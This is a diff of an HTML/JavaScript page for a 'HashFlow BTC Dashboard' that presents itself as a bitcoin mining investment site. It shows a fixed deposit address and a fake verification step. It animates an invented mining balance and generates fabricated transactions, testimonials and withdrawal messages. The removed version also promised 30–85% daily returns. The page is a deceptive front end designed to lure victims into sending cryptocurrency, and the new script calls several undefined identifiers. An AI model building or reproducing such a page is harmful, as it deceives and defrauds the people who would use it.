@@ -1,140 +1,212 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <title>HashFlow BTC Dashboard</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+
 <style>
 :root{--bg:#0b0f1a;--card:#131a2e;--accent:#f2a900;--text:#fff;--ok:#00ff99;--warn:#ffcc66;}
 [data-theme="light"]{--bg:#f2f3f7;--card:#fff;--text:#000;}
 body{margin:0;font-family:Arial,sans-serif;background:var(--bg);color:var(--text);}
 .card{max-width:95%;margin:16px auto;padding:18px;border-radius:12px;background:var(--card);}
-h2{color:var(--accent);text-align:center;margin-bottom:10px;}
-button,input,textarea{width:100%;padding:10px;border:none;border-radius:6px;margin-top:8px;font-size:14px;}
+h2{text-align:center;color:var(--accent);}
+button,input,textarea{width:100%;padding:10px;border:none;border-radius:6px;margin-top:8px;}
 button{background:var(--accent);font-weight:bold;cursor:pointer;}
 .hidden{display:none;}
-canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0f1a;display:block;}
-.tx{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #222;font-size:13px;}
+canvas{width:100%;height:140px;background:#0b0f1a;border-radius:8px;}
+.tx{display:flex;justify-content:space-between;border-bottom:1px solid #222;padding:6px 0;}
 .badge{padding:2px 6px;border-radius:6px;font-size:11px;}
-.pending{background:var(--warn);color:#000;}
 .confirmed{background:var(--ok);color:#000;}
-.progress{height:6px;background:#1b2340;border-radius:6px;margin-top:4px;overflow:hidden;}
-.progress div{height:100%;background:var(--ok);width:0%;transition:width 0.5s;}
-.toast{position:fixed;top:10px;right:10px;padding:10px 14px;background:var(--accent);color:#000;border-radius:8px;z-index:9999;opacity:0;transition:opacity 0.5s;}
-#topbar{display:none;position:fixed;top:0;left:0;right:0;background:#10162b;padding:10px 16px;z-index:999;display:flex;justify-content:space-between;align-items:center;}
-#usernameDisplay{font-weight:bold;}
-#menuBtn{font-size:22px;cursor:pointer;}
-#menu{display:none;position:fixed;top:50px;right:10px;background:var(--card);padding:10px;border-radius:10px;z-index:1000;}
-#menu div{padding:8px;cursor:pointer;}
+.pending{background:var(--warn);color:#000;}
 .stats{display:flex;justify-content:space-around;flex-wrap:wrap;}
-.stats div{background:var(--bg);padding:10px;margin:5px;border-radius:8px;}
-.btc-box{background:var(--bg);padding:10px;border-radius:8px;margin-top:10px;word-break:break-all;text-align:center;}
-.tx-container{max-height:260px;overflow:hidden;background:var(--bg);padding:10px;border-radius:8px;font-size:13px;position:relative;}
-.screenshot-img{max-width:100%;margin-top:10px;border-radius:8px;border:1px solid #222;}
-.plan{border:1px solid #222;border-radius:10px;padding:15px;margin:10px 0;text-align:center;}
-.plan h3{color:var(--accent);margin-bottom:10px;}
-.plan p{margin:5px 0;}
-.pay-section{display:none;margin-top:10px;}
-.countdown{color:var(--accent);font-weight:bold;margin-top:5px;}
+.stats div{background:var(--bg);padding:8px;border-radius:8px;margin:5px;}
+.btc-box{background:var(--bg);padding:10px;border-radius:8px;text-align:center;word-break:break-all;}
+.tx-container{max-height:250px;overflow:hidden;}
+.plan{border:1px solid #222;padding:15px;border-radius:10px;margin-top:10px;text-align:center;}
+.toast{position:fixed;top:10px;right:10px;background:var(--accent);padding:10px;border-radius:8px;opacity:0;}
+#topbar{display:none;position:fixed;top:0;left:0;right:0;background:#10162b;padding:10px;z-index:1000;display:flex;justify-content:space-between;}
+#menu{display:none;position:fixed;top:50px;right:10px;background:var(--card);padding:10px;border-radius:10px;}
+#menu div{padding:8px;cursor:pointer;}
 </style>
 </head>
-<body data-theme="dark"><div id="topbar">
+
+<body data-theme="dark">
+
+<div id="topbar">
   <div id="menuBtn">☰</div>
   <div id="usernameDisplay"></div>
-  <div></div>
 </div>
+
 <div id="menu">
   <div onclick="showSection('withdrawals')">Live Withdrawal Group</div>
-  <div onclick="showSection('support')">Contact Admin</div>
+  <div onclick="showSection('support')">Support</div>
   <div onclick="toggleTheme()">Toggle Theme</div>
-  <div onclick="logout()">Log Out</div>
-</div><div class="card" id="loginCard">
+  <div onclick="logout()">Logout</div>
+</div>
+
+<div class="card" id="loginCard">
   <h2>Verification Required</h2>
-  <input id="contactInput" placeholder="Enter your email or phone number">
-  <button onclick="sendCode()">Get verification code</button>
-  <p id="codeDisplay" class="hidden" style="text-align:center;color:var(--accent)">Your code: <b id="generatedCode"></b></p>
-  <p id="countdownDisplay" class="hidden" style="text-align:center">Code expires in <span id="countdown">60</span>s</p>
-  <input id="codeInput" class="hidden" placeholder="Enter verification code">
+  <input id="contactInput" placeholder="Email or Phone">
+  <button onclick="sendCode()">Get Code</button>
+  <p id="codeDisplay" class="hidden">Code: <b id="generatedCode"></b></p>
+  <input id="codeInput" class="hidden" placeholder="Enter code">
   <button id="submitCodeBtn" class="hidden" onclick="verifyCode()">Submit</button>
-  <button id="resendCodeBtn" class="hidden" onclick="sendCode()">Resend code</button>
-</div><div id="dashboard" class="hidden">
-  <div class="card">
-    <h2>BTC Deposit Address</h2>
-    <div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
-    <button onclick="copyAddress()">Copy Address</button>
-    <div style="text-align:center;margin-top:10px;">
-      <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
-    </div>
-  </div>  <div class="card">
-    <h2>Mining Dashboard</h2>
-    <p style="text-align:center;color:var(--accent);">Earn 30% daily return</p>
-    <div class="btc" id="balance">0.00000000 BTC</div>
-    <canvas id="chart"></canvas>
-    <div class="stats">
-      <div>Hashrate: 120 TH/s</div>
-      <div>Blocks: <span id="blocks">0</span></div>
-      <div>Uptime: <span id="uptime">0h 0m</span></div>
-    </div>
-  </div>  <div class="card">
-    <h2>Recent Activity</h2>
-    <div class="tx-container" id="txs"></div>
-  </div>  <h2>Investment Plans</h2>
-  <div class="card" id="plansContainer"></div>  <div class="card" id="liveTestimonials">
-    <h2>Live Testimonials</h2>
-    <div id="testimonialFeed"></div>
-  </div>  <div class="card hidden" id="withdrawals">
-    <h2>Live Withdrawal Group</h2>
-    <div id="feed"></div>
-    <div id="stats" class="stats"></div>
-  </div>  <div class="card hidden" id="support">
-    <h2>Support Inbox</h2>
-    <textarea id="supportMsg" placeholder="Write message..." style="width:100%;height:80px;"></textarea>
-    <button onclick="sendSupport()">Send</button>
-    <div id="supportReply"></div>
-  </div>
-</div><div id="toast" class="toast"></div><script>
-// Top Menu
+</div>
+
+<div id="dashboard" class="hidden">
+
+<div class="card">
+<h2>BTC Deposit Address</h2>
+<div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
+<button onclick="copyAddress()">Copy Address</button>
+</div>
+
+<div class="card">
+<h2>Mining Dashboard</h2>
+<div id="balance">0.00000000 BTC</div>
+<canvas id="chart"></canvas>
+<div class="stats">
+  <div>Hashrate: 120 TH/s</div>
+  <div>Blocks: <span id="blocks">0</span></div>
+  <div>Uptime: <span id="uptime">0h 0m</span></div>
+</div>
+</div>
+
+<div class="card">
+<h2>Recent Activity</h2>
+<div class="tx-container" id="txs"></div>
+</div>
+
+<div class="card">
+<h2>Live Testimonials</h2>
+<div id="testimonialFeed"></div>
+</div>
+
+<div class="card hidden" id="withdrawals">
+<h2>Live Withdrawal Group</h2>
+<div id="feed"></div>
+</div>
+
+<div class="card hidden" id="support">
+<h2>Support</h2>
+<textarea placeholder="Write message..."></textarea>
+<button>Send</button>
+</div>
+
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
 menuBtn.onclick=()=>menu.style.display=menu.style.display==='block'?'none':'block';
-function showSection(id){document.querySelectorAll('.card').forEach(c=>{if(c.id==='loginCard')return;if(['withdrawals','support'].includes(c.id))c.classList.add('hidden');});document.getElementById(id).classList.remove('hidden');menu.style.display='none';}
-function toggleTheme(){const t=document.body.dataset.theme==='dark'?'light':'dark';document.body.dataset.theme=t;localStorage.setItem('theme',t);}
-if(localStorage.getItem('theme'))document.body.dataset.theme=localStorage.getItem('theme');
-function logout(){localStorage.removeItem('verifiedUser');location.reload();}
 
-// Verification
-let generatedCode='',timer=null,timeLeft=60,userContact='';
-function sendCode(){userContact=document.getElementById('contactInput').value.trim();if(!userContact){alert('Enter email or phone');return;}generatedCode=Math.floor(100000+Math.random()*900000).toString();document.getElementById('generatedCode').innerText=generatedCode;document.getElementById('codeDisplay').classList.remove('hidden');document.getElementById('countdownDisplay').classList.remove('hidden');document.getElementById('codeInput').classList.remove('hidden');document.getElementById('submitCodeBtn').classList.remove('hidden');document.getElementById('resendCodeBtn').classList.remove('hidden');clearInterval(timer);timeLeft=60;document.getElementById('countdown').innerText=timeLeft;timer=setInterval(()=>{timeLeft--;document.getElementById('countdown').innerText=timeLeft;if(timeLeft<=0){clearInterval(timer);alert('Code expired. Resend.');}},1000);}
-function verifyCode(){if(document.getElementById('codeInput').value.trim()!==generatedCode){alert('Invalid code');return;}localStorage.setItem('verifiedUser',JSON.stringify({contact:userContact}));enterDashboard();}
-function enterDashboard(){document.getElementById('loginCard').style.display='none';document.getElementById('dashboard').classList.remove('hidden');document.getElementById('topbar').style.display='flex';document.getElementById('usernameDisplay').innerText=userContact;initializeDashboard();}
-if(localStorage.getItem('verifiedUser')){userContact=JSON.parse(localStorage.getItem('verifiedUser')).contact;enterDashboard();}
-
-// BTC copy
-function copyAddress(){navigator.clipboard.writeText(document.getElementById('btcAddress').innerText).then(()=>showToast('BTC address copied!'))}
-function showToast(msg){const t=document.getElementById('toast');t.innerText=msg;t.style.opacity=1;setTimeout(()=>{t.style.opacity=0;},3000);}
-
-// Initialize Dashboard
-function initializeDashboard(){
-  // Mining chart
-  const canvas=document.getElementById('chart'),ctx=canvas.getContext('2d');let points=[0],balance=0,blocks=0,minutes=0,rate=0.00000008,paused=false;
-  setInterval(()=>{ctx.clearRect(0,0,canvas.width,canvas.height);const w=canvas.width/50;ctx.beginPath();let lastY=canvas.height-points[0]*canvas.height/0.01;ctx.moveTo(0,lastY);for(let i=1;i<points.length;i++){let y=canvas.height-points[i]*canvas.height/0.01;ctx.lineTo(i*w,y);}ctx.strokeStyle='#f2a900';ctx.lineWidth=2;ctx.stroke();const last=points[points.length-1]||0;points.push(last+rate);if(points.length>50)points.shift();},500);
-  setInterval(()=>{if(!paused){balance+=rate;document.getElementById('balance').innerText=balance.toFixed(8)+' BTC';}},1000);
-  setInterval(()=>{blocks+=Math.floor(Math.random()*2);minutes++;document.getElementById('blocks').innerText=blocks;document.getElementById('uptime').innerText=Math.floor(minutes/60)+'h '+(minutes%60)+'m';},60000);
-
-  // Recent Activity
-  const txs=document.getElementById('txs');function addTx(){const div=document.createElement('div');div.className='tx';const val=(Math.random()*0.0004+0.00002).toFixed(8);const status=Math.random()>0.5?'Completed':'Pending';div.innerHTML=`<span>+${val} BTC</span><span class="${status==='Completed'?'confirmed':'pending'}">${status}</span>`;txs.prepend(div);if(txs.children.length>500)txs.removeChild(txs.lastChild);}setInterval(addTx,1500);
-
-  // Investment Plans
-  const plans=[
-    {name:'Plan A',profit:'30%',min:200,max:599},
-    {name:'Plan B',profit:'45%',min:600,max:1000},
-    {name:'Plan C',profit:'60%',min:1100,max:2000},
-    {name:'Plan D',profit:'75%',min:2000,max:4999},
-    {name:'Plan E',profit:'80%',min:5000,max:9999},
-    {name:'Plan F',profit:'85%',min:10000,max:'Unlimited'}
-  ];
-  const container=document.getElementById('plansContainer');container.innerHTML='';
-  plans.forEach((p,i)=>{
-    const div=document.createElement('div');div.className='plan';div.innerHTML=`<h3>${p.name}</h3><p>Daily Profit: ${p.profit}</p><p>Min: $${p.min}</p><p>Max: ${p.max}</p><div class="pay-section" id="pay${i}"><p>Send BTC to:</p><div class="btc-box">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div><input type="file" id="screenshot${i}"><button onclick="confirmPayment(${i})">Paid</button><img id="preview${i}" class="screenshot-img" style="display:none"><p class="countdown" id="countdown${i}">Withdrawal available in 3d 0h 0m 0s</p></div><button onclick="showPay(${i})">Invest Now</button>`;container.appendChild(div);});
+function showSection(id){
+  document.querySelectorAll('.card').forEach(c=>{
+    if(['withdrawals','support'].includes(c.id)) c.classList.add('hidden');
+  });
+  document.getElementById(id).classList.remove('hidden');
+  menu.style.display='none';
 }
-function showPay(i){document.getElementById('pay'+i).style.display='block';}
-function confirmPayment(i){const file=document.getElementById('screenshot'+i).files[0];if(!file){alert('Upload screenshot');return;}const reader=new FileReader();reader.onload=function(e){const img=document.getElementById('preview'+i);img.src=e.target.result;img.style.display='block';showToast('Payment confirmed! Withdrawal countdown started.');};reader.readAsDataURL(file);}
-</script></body>
-    </html>
+
+function toggleTheme(){
+  document.body.dataset.theme =
+  document.body.dataset.theme==='dark'?'light':'dark';
+}
+
+function logout(){localStorage.clear();location.reload();}
+
+let generatedCode='',userContact='';
+function sendCode(){
+  userContact=contactInput.value.trim();
+  if(!userContact)return alert('Enter contact');
+  generatedCode=Math.floor(100000+Math.random()*900000);
+  generatedCodeEl.innerText=generatedCode;
+  codeDisplay.classList.remove('hidden');
+  codeInput.classList.remove('hidden');
+  submitCodeBtn.classList.remove('hidden');
+}
+
+function verifyCode(){
+  if(codeInput.value!=generatedCode)return alert('Wrong code');
+  localStorage.setItem('verified',userContact);
+  enterDashboard();
+}
+
+function enterDashboard(){
+  loginCard.style.display='none';
+  dashboard.classList.remove('hidden');
+  topbar.style.display='flex';
+  usernameDisplay.innerText=userContact;
+  startMining();
+}
+
+if(localStorage.getItem('verified')){
+  userContact=localStorage.getItem('verified');
+  enterDashboard();
+}
+
+function copyAddress(){
+  navigator.clipboard.writeText(btcAddress.innerText);
+  toast('Address copied');
+}
+
+function toast(msg){
+  toastEl.innerText=msg;
+  toastEl.style.opacity=1;
+  setTimeout(()=>toastEl.style.opacity=0,3000);
+}
+
+function startMining(){
+const canvas=document.getElementById('chart');
+const ctx=canvas.getContext('2d');
+let points=[0],balance=0,blocks=0,minutes=0;
+const rate=0.00000002;
+
+setInterval(()=>{
+  balance+=rate;
+  balanceEl.innerText=balance.toFixed(8)+' BTC';
+  points.push(balance);
+  if(points.length>40)points.shift();
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  ctx.beginPath();
+  points.forEach((p,i)=>{
+    const x=i*(canvas.width/40);
+    const y=canvas.height-(p*canvas.height*5000);
+    i?ctx.lineTo(x,y):ctx.moveTo(x,y);
+  });
+  ctx.strokeStyle='#f2a900';
+  ctx.stroke();
+},1000);
+
+setInterval(()=>{
+  blocks+=Math.floor(Math.random()*2);
+  minutes++;
+  blocksEl.innerText=blocks;
+  uptimeEl.innerText=`${Math.floor(minutes/60)}h ${minutes%60}m`;
+},60000);
+
+setInterval(()=>{
+  const d=document.createElement('div');
+  const v=(Math.random()*0.0005).toFixed(8);
+  d.innerHTML=`<span>+${v} BTC</span><span class="badge confirmed">Completed</span>`;
+  txs.prepend(d);
+  if(txs.children.length>100)txs.lastChild.remove();
+},1500);
+
+setInterval(()=>{
+  const d=document.createElement('div');
+  d.innerText=`✅ User withdrew ${(Math.random()*0.01).toFixed(4)} BTC`;
+  testimonialFeed.prepend(d);
+},3000);
+
+setInterval(()=>{
+  const d=document.createElement('div');
+  d.innerText=`💸 Withdrawal ${(Math.random()*0.02).toFixed(4)} BTC processed`;
+  feed.prepend(d);
+},2500);
+}
+</script>
+
+</body>
+  </html>
